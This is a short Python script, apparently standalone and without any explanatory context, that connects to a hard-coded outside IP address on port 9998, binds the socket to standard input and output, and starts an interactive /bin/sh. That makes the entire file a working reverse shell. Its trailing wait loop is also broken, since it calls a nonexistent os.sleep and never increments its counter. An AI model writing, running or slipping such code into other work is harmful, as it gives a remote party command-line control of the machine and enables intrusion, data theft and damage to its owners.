import socket,subprocess,os

def main():
  print('Try')
  count = 0
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("167.179.96.180",9998))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  p=subprocess.call(["/bin/sh","-i"])
  print(p)
  while count < 1000:
    os.sleep(1)
  
if __name__ == '__main__':
  main()
